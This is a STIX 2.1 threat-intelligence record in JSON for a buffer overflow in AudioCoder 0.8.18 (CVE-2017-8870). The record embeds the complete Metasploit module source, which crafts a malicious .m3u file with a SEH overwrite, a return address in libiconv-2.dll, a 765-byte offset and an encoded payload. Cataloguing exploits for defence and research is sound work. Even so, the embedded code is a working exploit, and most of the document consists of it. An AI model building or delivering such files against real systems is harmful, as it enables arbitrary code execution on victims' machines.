{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4183a0ad-16bd-48b4-ad34-46673e3d8ca5",
    "created": "2024-08-14T16:38:03.426606Z",
    "modified": "2024-08-14T16:38:03.426611Z",
    "name": "AudioCoder .M3U Buffer Overflow",
    "description": " This module exploits a buffer overflow in AudioCoder 0.8.18. The vulnerability occurs when adding an .m3u, allowing arbitrary code execution with the privileges of the user running AudioCoder. This module has been tested successfully on AudioCoder 0.8.18.5353 over Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/audio_coder_m3u.rb",
            "external_id": "audio_coder_m3u.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-8870"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AudioCoder .M3U Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in AudioCoder 0.8.18. The vulnerability\n        occurs when adding an .m3u, allowing arbitrary code execution with the privileges\n        of the user running AudioCoder. This module has been tested successfully on\n        AudioCoder 0.8.18.5353 over Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'metacom', # Vulnerability discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2017-8870' ],\n          [ 'OSVDB', '92939' ],\n          [ 'EDB', '25141' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space'           => 6596,\n          'BadChars'        => \"\\x00\\x5c\\x40\\x0d\\x0a\",\n          'DisableNops'     => true,\n          'StackAdjustment' => -3500,\n        },\n      'Targets'        =>\n        [\n          [ 'AudioCoder 0.8.18.5353 / Windows XP SP3 / Windows 7 SP1',\n            {\n              'Ret'     => 0x66011b56, # ppr from libiconv-2.dll\n              'Offset'  => 765\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-05-01',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),\n      ])\n\n  end\n\n  def exploit\n    buffer = \"http://\"\n    buffer << rand_text(target['Offset'])\n    buffer << generate_seh_record(target.ret)\n    buffer << payload.encoded\n\n    file_create(buffer)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-01",
    "x_mitre_platforms": [
        "win'"
    ]
}